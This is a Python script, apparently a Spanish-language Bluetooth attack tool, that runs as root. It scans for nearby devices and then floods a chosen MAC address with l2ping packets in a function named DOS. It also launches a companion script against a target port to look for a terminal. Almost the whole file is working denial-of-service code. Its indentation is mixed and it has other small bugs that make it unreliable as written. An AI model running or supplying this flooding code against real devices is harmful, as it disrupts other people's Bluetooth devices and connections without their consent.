#! /usr/bin/python env
#_*_ coding: utf8 _*_
import os, time, sys
import socket
import argparse
import threading
from getpass import getuser
W = '\033[0;37m'
R = '\033[1;31m'  # red
G = '\033[1;32m'  # green
O = '\033[1;33m'  # orange
B = '\033[1;34m'  # blue
P = '\033[1;35m'  # purple
C = '\033[1;36m'  # cyan
GRs = '\033[1;37m'  # gray

print(W+"BuxyBx - Mrx04programmer - "+R+"[Root !!]"+W)
user = getuser()
if user != "root":
	print(G+"Ejecuta el archivo con el usuario root")
	exit()
time.sleep(3)
os.system("sudo hciconfig hci0 up")
#Opciones
parse = argparse.ArgumentParser()
parse.add_argument("-d", help="Interfaz bluetooth")
parse.add_argument("-i", "--ifaces", help="Visualizar Interfaces bluetooth (ex: -i 1)")
parse.add_argument("-m","--mac", help="Comenzar ataque hacia una mac en especifico")
parse.add_argument("-p","--packages_size", help="Número de paquetes a enviar")
parse.add_argument("-po", "--port", help="Escoger algún puerto para encontrar terminal (opcional)")
parse.add_argument("-s","--scan", help="Escanea dispostivos bluetooth(BR)")
parse = parse.parse_args()

def term_blue():
	os.system("xterm -geometry 112x26 -e 'sudo python blt.py -d "+str(parse.mac)+" -i "+str(parse.d)+" -p "+str(parse.port)+"'")

def DOS(target_addr, packages_size):
	os.system("sudo hciconfig hci0 up")
	os.system('l2ping -i hci0 -s ' + str(parse.packages_size) +' -f ' + parse.mac)

def packets():
	os.system("sudo hciconfig hci0 up")
	threading.Thread(target=DOS, args=[str(parse.mac), str(parse.packages_size)]).start()

def main():
	if parse.scan:
		print(B+"[+] "+W+"Escaneando...")
		os.system("sudo hciconfig hci0")
		os.system("xterm -geometry 131x37 -e 'bluetoothctl scan on'")
		print(B+"[*] "+W+"Escaneo completado.")
	if parse.ifaces:
		os.system("hciconfig")
	if parse.packages_size:
		packets()
	if parse.d:
		iface=parse.d
	if parse.port:
		term_blue()
if __name__ == '__main__':
    try:
	main()
    except KeyboardInterrupt:
        print(R+"[-] Exit bluesniff")
    except Exception as e:
	    print(R+"ERR "+W+e)
